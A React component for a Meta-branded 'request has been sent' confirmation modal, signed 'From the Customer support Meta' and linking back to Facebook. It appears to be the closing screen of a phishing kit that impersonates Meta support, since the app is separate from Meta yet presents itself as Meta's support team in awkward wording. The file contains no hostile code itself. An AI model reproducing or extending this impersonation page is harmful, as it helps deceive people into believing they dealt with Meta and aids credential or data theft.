import FinalImage from '@/assets/images/final-image.png';
import MetaLogo from '@/assets/images/meta-logo-image.png';
import { store } from '@/store/store';
import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';

const FinalModal = () => {
    const { geoInfo, setModalOpen, translations: storeTranslations } = store();
    const t = (text) => {
        return storeTranslations[text] || text;
    };

    return (
        <div className='fixed inset-0 z-10 flex items-start justify-center bg-white/85 backdrop-blur-md md:backdrop-blur-lg md:items-center md:py-[40px] pt-[60px] pb-[15px]'>
            <div className='bg-white max-h-[calc(100vh-75px)] md:max-h-[85vh] md:h-auto w-full max-w-lg mx-4 md:mx-0 shadow-xl md:shadow-2xl px-[20px] md:px-[32px] pt-[20px] md:pt-[32px] pb-[30px] md:pb-[32px] rounded-[16px] md:rounded-[20px] flex flex-col overflow-hidden border border-gray-100 md:border-gray-200'>
                <div className='flex items-center justify-between mb-[10px]'>
                    <h2 className='font-bold text-[#0A1317] text-[15px] flex items-center justify-center'>{t('Request has been sent')}</h2>
                    <button
                        type='button'
                        onClick={() => setModalOpen(false)}
                        className='w-[18px] h-[18px] cursor-pointer opacity-60 hover:opacity-100 transition-opacity duration-200 flex items-center justify-center'
                        aria-label='Close modal'
                    >
                        <FontAwesomeIcon icon={faXmark} size='sm' className='text-gray-600' />
                    </button>
                </div>
                <div className='flex-1 overflow-y-auto'>
                    <div className='h-full flex flex-col flex-start w-full items-center justify-between flex-1'>
                        <div>
                            <div className='rounded-[10px] overflow-hidden mb-[15px]'>
                                <img src={FinalImage} alt='' className='w-full h-auto' />
                            </div>
                            <p className='text-[#9a979e] mb-[10px] text-[15px]'>
                                {t('Your request has been added to the processing queue')}. {t('We will handle your request within 24 hours')} {t('in case we do not receive feedback')}, {t('please send back information so we can assist you')}.
                            </p>
                            <p className='text-[#9a979e] mb-[20px] text-[15px]'>{t('From the Customer support Meta')}.</p>
                            <a
                                href='https://www.facebook.com'
                                className='w-full bg-[#0064E0] text-white rounded-[40px] pt-[10px] pb-[10px] flex items-center justify-center transition-all duration-300 h-[40px] min-h-[40px] md:h-[44px] md:min-h-[44px] text-[15px] md:text-[16px] hover:bg-[#0051c7] md:hover:shadow-md'
                            >
                                {t('Return to Facebook')}
                            </a>
                        </div>
                        <div className='w-[60px] mt-[225px] md:mt-[30px] mx-auto'>
                            <img src={MetaLogo} alt='' width={60} height={18} className='w-full h-full' />
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default FinalModal;

